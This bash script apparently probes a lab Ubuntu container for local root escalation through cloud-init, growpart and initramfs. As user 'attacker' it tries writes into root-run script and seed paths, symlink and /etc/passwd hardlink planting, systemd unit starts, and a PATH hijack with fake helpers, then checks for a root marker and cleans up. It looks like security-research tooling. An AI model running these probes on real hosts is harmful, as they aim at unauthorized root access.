#!/usr/bin/env bash
set -u -o pipefail

target="${1:-ubuntu24-server-lpe-target}"

printf '## host container proof\n'
docker inspect -f 'name={{.Name}} image={{.Config.Image}} status={{.State.Status}} started={{.State.StartedAt}}' "$target" 2>&1 || true

docker exec -i "$target" bash -s <<'TARGET'
set +e
export LC_ALL=C

probe="cloud_init_default"
work="/tmp/${probe}"
created_list="${work}/created-sensitive-paths"
root_marker="/root/${probe}_root_marker"

section() {
  printf '\n## %s\n' "$1"
}

run_as() {
  user="$1"
  label="$2"
  cmd="$3"
  printf '\n### %s: %s\n' "$user" "$label"
  timeout 30s runuser -u "$user" -- bash -lc "$cmd" 2>&1
  printf 'rc=%s\n' "$?"
}

pkg_line() {
  pkg="$1"
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' "$pkg" 2>/dev/null ||
    printf '%s\t(not installed)\tun\n' "$pkg"
}

stat_path() {
  p="$1"
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %a %U:%G %F %n' "$p" 2>&1
    getcap "$p" 2>/dev/null || true
  else
    printf 'MISSING %s\n' "$p"
  fi
}

show_unit() {
  u="$1"
  printf '\n### %s\n' "$u"
  systemctl show \
    -p LoadState -p UnitFileState -p ActiveState -p SubState -p Result \
    -p ConditionResult -p FragmentPath -p User -p Group -p ExecStart \
    -p ExecStartPre -p Environment -p EnvironmentFiles -p Wants -p Requires \
    -p After -p Before -p Triggers -p TriggeredBy "$u" 2>&1 || true
}

snippet() {
  f="$1"
  printf '\n### %s\n' "$f"
  if [ -e "$f" ] || [ -L "$f" ]; then
    nl -ba "$f" | sed -n '1,240p'
  else
    echo "MISSING"
  fi
}

cleanup_probe() {
  rm -rf "$work" \
    /tmp/cloud_init_default* \
    /home/attacker/cloud_init_default 2>/dev/null || true
  rm -f "$root_marker" 2>/dev/null || true
}

cleanup_probe
mkdir -p "$work"
chmod 0777 "$work"
: > "$created_list"
chmod 0666 "$created_list"

section "target and uid1001 proof"
sed -n '1,8p' /etc/os-release
uname -a
ps -p 1 -o user=,comm=,args=
printf 'systemd is-system-running: '; systemctl is-system-running 2>&1 || true
printf 'systemd-detect-virt -v: '; systemd-detect-virt -v 2>&1 || true
printf 'systemd-detect-virt -c: '; systemd-detect-virt -c 2>&1 || true
id attacker
groups attacker

section "cloud and growpart package versions"
for pkg in \
  cloud-init cloud-guest-utils cloud-initramfs-copymods \
  cloud-initramfs-dyn-netconf cloud-initramfs-growroot \
  cloud-initramfs-rescuevol cloud-initramfs-tools cloud-utils growpart \
  initramfs-tools initramfs-tools-core systemd udev util-linux fdisk gdisk \
  parted e2fsprogs xfsprogs; do
  pkg_line "$pkg"
done | sort

printf '\n[owners of installed helper commands]\n'
for c in cloud-init cloud-id cloud-init-per ds-identify growpart mount-image-callback sfdisk partx udevadm; do
  printf '%s -> ' "$c"
  command -v "$c" || true
done
printf '\n[dpkg file ownership]\n'
for p in /usr/bin/growpart /usr/bin/cloud-init /usr/bin/cloud-id /usr/bin/cloud-init-per \
  /usr/lib/systemd/system-generators/cloud-init-generator; do
  [ -e "$p" ] || [ -L "$p" ] || continue
  dpkg -S "$p" 2>&1 || true
done

section "cloud-init status and default units"
cloud-init status --long 2>&1 || true
systemctl list-unit-files --no-pager --no-legend '*cloud*' '*grow*' '*initramfs*' 2>&1 | sort
printf '\n[matching timers]\n'
systemctl list-timers --all --no-pager 2>&1 | sed -n '1,240p' | awk 'BEGIN{IGNORECASE=1} /cloud|grow|initramfs|NEXT|LEFT|PASSED|UNIT/'

for u in \
  cloud-init-local.service cloud-init.service cloud-config.service \
  cloud-final.service cloud-init.target cloud-init-hotplugd.socket \
  cloud-init-hotplugd.service cloud-init-main.service cloud-init-network.service \
  growpart.service cloud-initramfs-growroot.service systemd-growfs-root.service \
  systemd-growfs@.service mdadm-grow-continue@.service \
  plymouth-switch-root-initramfs.service; do
  show_unit "$u"
done

section "cloud config, seed, state, and helper path permissions"
for p in \
  /etc/cloud /etc/cloud/cloud.cfg /etc/cloud/cloud.cfg.d /etc/cloud/templates \
  /etc/cloud/ds-identify.cfg /etc/cloud/cloud.cfg.d/99-installer.cfg \
  /var/lib/cloud /var/lib/cloud/data /var/lib/cloud/seed \
  /var/lib/cloud/seed/nocloud /var/lib/cloud/seed/nocloud-net \
  /var/lib/cloud/instances /var/lib/cloud/instance /var/lib/cloud/scripts \
  /var/lib/cloud/scripts/per-boot /var/lib/cloud/scripts/per-instance \
  /var/lib/cloud/scripts/per-once /var/lib/cloud/sem \
  /run/cloud-init /run/cloud-init/status.json /run/cloud-init/result.json \
  /run/cloud-init/instance-data.json /run/cloud-init/instance-data-sensitive.json \
  /run/cloud-init/cloud-id /run/cloud-init/ds-identify.log \
  /usr/bin/cloud-init /usr/bin/cloud-id /usr/bin/cloud-init-per /usr/bin/ds-identify \
  /usr/lib/cloud-init /usr/share/cloud-init /usr/lib/python3/dist-packages/cloudinit \
  /usr/lib/systemd/system-generators/cloud-init-generator \
  /lib/systemd/system-generators/cloud-init-generator \
  /usr/bin/growpart /etc/growroot-disabled /etc/initramfs-tools \
  /etc/initramfs-tools/conf.d /etc/initramfs-tools/hooks /etc/initramfs-tools/scripts \
  /usr/share/initramfs-tools/hooks /usr/share/initramfs-tools/scripts \
  /usr/share/initramfs-tools/hooks/cloud-initramfs-dyn-netconf \
  /usr/share/initramfs-tools/hooks/copymods \
  /usr/share/initramfs-tools/scripts/init-premount/cloud-initramfs-dyn-netconf \
  /usr/share/initramfs-tools/scripts/init-bottom/cloud-initramfs-dyn-netconf \
  /usr/share/initramfs-tools/scripts/init-bottom/copymods \
  /var/lib/initramfs-tools /boot /run /var/lib; do
  stat_path "$p"
done

section "installed cloud/growpart file inventory"
for pkg in cloud-init cloud-guest-utils cloud-initramfs-copymods cloud-initramfs-dyn-netconf cloud-initramfs-growroot; do
  printf '\n### dpkg -L %s\n' "$pkg"
  dpkg -L "$pkg" 2>&1 | sort | sed -n '1,260p'
done

section "root-run references to cloud-init, seeds, scripts, and growpart"
if command -v rg >/dev/null 2>&1; then
  rg -n 'cloud-init|cloudinit|cloud.cfg|/var/lib/cloud|/run/cloud-init|per-boot|per-instance|DataSource|datasource|seed|growpart|growroot' \
    /usr/lib/systemd /lib/systemd /etc/systemd /usr/share/initramfs-tools \
    /etc/initramfs-tools /usr/lib/tmpfiles.d /etc/tmpfiles.d \
    /lib/udev/rules.d /etc/udev/rules.d 2>/dev/null | sed -n '1,260p'
else
  find /usr/lib/systemd /lib/systemd /etc/systemd /usr/share/initramfs-tools \
    /etc/initramfs-tools /usr/lib/tmpfiles.d /etc/tmpfiles.d \
    /lib/udev/rules.d /etc/udev/rules.d -type f -maxdepth 5 2>/dev/null |
    xargs sed -n '/cloud-init\|cloudinit\|growpart\|growroot/p' 2>/dev/null | sed -n '1,260p'
fi

section "root helper source snippets"
for f in \
  /usr/bin/growpart \
  /usr/share/initramfs-tools/hooks/cloud-initramfs-dyn-netconf \
  /usr/share/initramfs-tools/hooks/copymods \
  /usr/share/initramfs-tools/scripts/init-premount/cloud-initramfs-dyn-netconf \
  /usr/share/initramfs-tools/scripts/init-bottom/cloud-initramfs-dyn-netconf \
  /usr/share/initramfs-tools/scripts/init-bottom/copymods; do
  snippet "$f"
done
printf '\n### growpart command/path-sensitive lines\n'
if [ -e /usr/bin/growpart ]; then
  if command -v rg >/dev/null 2>&1; then
    rg -n 'PATH|DEBUG_LOG|TMPDIR|mktemp|sfdisk|partx|flock|udevadm|exec|trap|restore|dd ' /usr/bin/growpart
  else
    sed -n '/PATH\|DEBUG_LOG\|TMPDIR\|mktemp\|sfdisk\|partx\|flock\|udevadm\|exec\|trap\|restore\|dd /p' /usr/bin/growpart
  fi
fi

section "uid1001 read/write checks for cloud trust boundaries"
run_as attacker "read cloud instance data" '
for p in /run/cloud-init/instance-data.json /run/cloud-init/instance-data-sensitive.json \
  /run/cloud-init/status.json /run/cloud-init/result.json /var/lib/cloud/instance/user-data.txt \
  /var/lib/cloud/instance/vendor-data.txt; do
  printf "read %s -> " "$p"
  if [ -r "$p" ]; then
    head -c 160 "$p" 2>&1
    echo
  else
    echo "not readable or missing"
  fi
done
'

run_as attacker "write cloud config, datasource, seed, state, script, and run paths" '
set +e
probe="cloud_init_default"
work="/tmp/${probe}"
created="${work}/created-sensitive-paths"
err="${work}/attacker-write.err"
try_touch() {
  p="$1"
  printf "touch %s -> " "$p"
  if touch "$p" 2>"$err"; then
    echo OK
    echo "$p" >> "$created"
    rm -f "$p" 2>/dev/null || true
  else
    tr "\n" " " < "$err"
    echo
  fi
}
try_mkdir() {
  p="$1"
  printf "mkdir %s -> " "$p"
  if mkdir -p "$p" 2>"$err"; then
    echo OK
    echo "$p" >> "$created"
    rmdir "$p" 2>/dev/null || true
  else
    tr "\n" " " < "$err"
    echo
  fi
}
for p in \
  /etc/cloud/cloud.cfg \
  /etc/cloud/cloud.cfg.d/99-cloud-init-default.cfg \
  /etc/cloud/templates/cloud-init-default.tmpl \
  /etc/cloud/ds-identify.cfg \
  /var/lib/cloud/seed/nocloud/user-data \
  /var/lib/cloud/seed/nocloud/meta-data \
  /var/lib/cloud/seed/nocloud-net/user-data \
  /var/lib/cloud/seed/nocloud-net/meta-data \
  /var/lib/cloud/instances/iid-local01/user-data.txt \
  /var/lib/cloud/instances/iid-local01/scripts/per-boot/00-cloud-init-default \
  /var/lib/cloud/scripts/per-boot/00-cloud-init-default \
  /var/lib/cloud/scripts/per-instance/00-cloud-init-default \
  /var/lib/cloud/scripts/per-once/00-cloud-init-default \
  /var/lib/cloud/sem/cloud-init-default \
  /run/cloud-init/status.json \
  /run/cloud-init/result.json \
  /run/cloud-init/instance-data.json \
  /run/cloud-init/instance-data-sensitive.json \
  /run/cloud-init/ds-identify.log \
  /run/cloud-init/cloud-init-generator.log \
  /run/cloud-init/sem/cloud-init-default \
  /etc/growroot-disabled \
  /etc/initramfs-tools/conf.d/cloud-init-default \
  /etc/initramfs-tools/hooks/cloud-init-default \
  /etc/initramfs-tools/scripts/init-bottom/cloud-init-default \
  /usr/share/initramfs-tools/scripts/init-bottom/cloud-init-default \
  /boot/cloud-init-default; do
  try_touch "$p"
done
for d in \
  /etc/cloud/cloud.cfg.d/cloud-init-default-dir \
  /var/lib/cloud/cloud-init-default-dir \
  /var/lib/cloud/seed/nocloud/cloud-init-default-dir \
  /var/lib/cloud/scripts/per-boot/cloud-init-default-dir \
  /run/cloud-init/cloud-init-default-dir \
  /run/cloud-init/sem/cloud-init-default-dir \
  /etc/initramfs-tools/hooks/cloud-init-default-dir; do
  try_mkdir "$d"
done
'

run_as attacker "symlink and hardlink planting attempts" '
set +e
probe="cloud_init_default"
work="/tmp/${probe}"
created="${work}/created-sensitive-paths"
err="${work}/attacker-link.err"
ln -sf /root/${probe}_root_marker "$work/root-marker-link"
for dst in \
  /var/lib/cloud/scripts/per-boot/00-cloud-init-default \
  /var/lib/cloud/seed/nocloud/user-data \
  /run/cloud-init/instance-data.json \
  /etc/cloud/cloud.cfg.d/99-cloud-init-default.cfg; do
  printf "symlink %s -> " "$dst"
  if ln -s "$work/root-marker-link" "$dst" 2>"$err"; then
    echo OK
    echo "$dst" >> "$created"
    rm -f "$dst" 2>/dev/null || true
  else
    tr "\n" " " < "$err"
    echo
  fi
done
for dst in \
  /var/lib/cloud/scripts/per-instance/00-cloud-init-default \
  /run/cloud-init/status.json \
  /etc/initramfs-tools/hooks/cloud-init-default-hardlink; do
  printf "hardlink %s -> " "$dst"
  if ln /etc/passwd "$dst" 2>"$err"; then
    echo OK
    echo "$dst" >> "$created"
    rm -f "$dst" 2>/dev/null || true
  else
    tr "\n" " " < "$err"
    echo
  fi
done
'

section "uid1001 trigger attempts"
run_as attacker "systemd starts for cloud/grow root units" '
for u in cloud-init-local.service cloud-init.service cloud-config.service \
  cloud-final.service cloud-init.target cloud-init-hotplugd.socket \
  cloud-init-hotplugd.service growpart.service cloud-initramfs-growroot.service \
  systemd-growfs-root.service plymouth-switch-root-initramfs.service; do
  echo "### systemctl start $u"
  systemctl start "$u" 2>&1 || true
done
'

run_as attacker "direct cloud-init and initramfs helper commands" '
for cmd in \
  "cloud-init status --long" \
  "cloud-init init --local" \
  "cloud-init modules --mode final" \
  "cloud-init single --name scripts-per-boot --frequency always" \
  "cloud-id" \
  "cloud-init-per once cloud-init-default /bin/sh -c id" \
  "update-initramfs -u -v"; do
  echo "### $cmd"
  bash -lc "$cmd" 2>&1 | sed -n "1,120p"
done
'

run_as attacker "direct growpart with attacker PATH helpers" '
set +e
probe="cloud_init_default"
base="/tmp/${probe}/growpart-attacker"
rm -rf "$base"
mkdir -p "$base/fakebin"
for helper in sfdisk flock partx udevadm blockdev partprobe; do
  printf '"'"'#!/bin/sh\necho FAKE_%s_UID=$(id -u) >> "%s/fake-helper.log"\nexit 1\n'"'"' "$helper" "$base" > "$base/fakebin/$helper"
  chmod +x "$base/fakebin/$helper"
done
truncate -s 20M "$base/disk.img"
PATH="$base/fakebin:$PATH" DEBUG_LOG="$base/debug.log" TMPDIR="$base" growpart -N "$base/disk.img" 1 >"$base/stdout" 2>"$base/stderr"
printf "growpart_rc=%s\n" "$?"
echo "[fake helper log]"
cat "$base/fake-helper.log" 2>/dev/null || echo "no fake helper executed"
echo "[stdout]"
sed -n "1,80p" "$base/stdout" 2>/dev/null
echo "[stderr]"
sed -n "1,80p" "$base/stderr" 2>/dev/null
echo "[debug]"
sed -n "1,80p" "$base/debug.log" 2>/dev/null
'

section "world-writable cloud/grow/initramfs-adjacent paths"
for d in /etc/cloud /var/lib/cloud /run/cloud-init /usr/lib/cloud-init /usr/share/cloud-init \
  /etc/initramfs-tools /usr/share/initramfs-tools /run /var/lib /tmp; do
  [ -d "$d" ] || continue
  find "$d" -xdev -maxdepth 4 -perm -0002 -printf '%M %u:%g %p -> %l\n' 2>/dev/null |
    awk 'BEGIN{IGNORECASE=1} /cloud|grow|initramfs|seed|tmp\/cloud_init_default/'
done

section "unexpected sensitive path writes recorded"
if [ -s "$created_list" ]; then
  sort -u "$created_list"
else
  echo "none"
fi

section "root proof sweep before cleanup"
if [ -e "$root_marker" ]; then
  echo "ROOT_MARKER_PRESENT"
  stat_path "$root_marker"
  sed -n '1,80p' "$root_marker" 2>/dev/null || true
else
  echo "NO_ROOT_MARKER"
fi
find /tmp /home/attacker -maxdepth 4 \( -name '*cloud_init_default*' -o -name '*cloud-init-default*' \) \
  -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort

section "cleanup"
cleanup_probe
if [ -e "$root_marker" ] || [ -e "$work" ]; then
  echo "cleanup_incomplete"
else
  echo "cleanup_complete"
fi
TARGET
